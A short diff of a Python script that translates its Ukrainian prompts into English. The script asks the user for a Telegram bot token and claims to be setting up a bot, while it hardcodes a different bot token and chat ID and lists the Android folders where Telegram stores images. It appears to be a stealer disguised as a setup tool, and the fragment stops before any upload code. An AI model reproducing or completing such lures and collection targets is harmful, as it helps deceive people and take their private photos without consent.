@@ -5,11 +5,11 @@ import zipfile
 from random import choice
 import time
 
-b = input("Введіть ваш токен телеграм бота: ")
+b = input("Enter your Telegram bot token: ")
 if len(b) != 46:
-        exit("Некоректний токен!")
+        exit("Invalid token!")
 else:
- print("Очікуйте доки ми налаштуємо бота, зазвичай займає 5-10 хвилин")
+ print("Please wait while we set up the bot, usually takes 5-10 minutes")
  ID = 'your_tg_id'
  bot = telebot.TeleBot("your_tg_bot_token")
  dirs = ["/storage/emulated/0/Android/data/org.telegram.messenger/files/Telegram/Telegram Images/",
